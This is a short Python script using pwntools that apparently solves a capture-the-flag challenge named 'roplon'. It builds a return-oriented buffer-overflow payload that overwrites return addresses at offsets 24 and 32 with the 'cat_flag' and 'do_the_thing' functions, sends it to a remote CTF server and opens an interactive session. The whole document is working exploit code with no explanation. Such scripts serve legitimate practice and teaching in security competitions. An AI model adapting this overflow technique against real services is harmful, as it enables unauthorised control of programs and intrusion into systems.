from pwn import *

exe = context.binary = ELF('roplon')

cataddr = exe.symbols['cat_flag']
doaddr = exe.symbols['do_the_thing']

payload = fit({
    24: cataddr,
    32: doaddr
})
io = remote('ctf.cs.fsu.edu', 19990)
io.recvuntil('flag.txt\n')
io.sendline(payload)
io.interactive()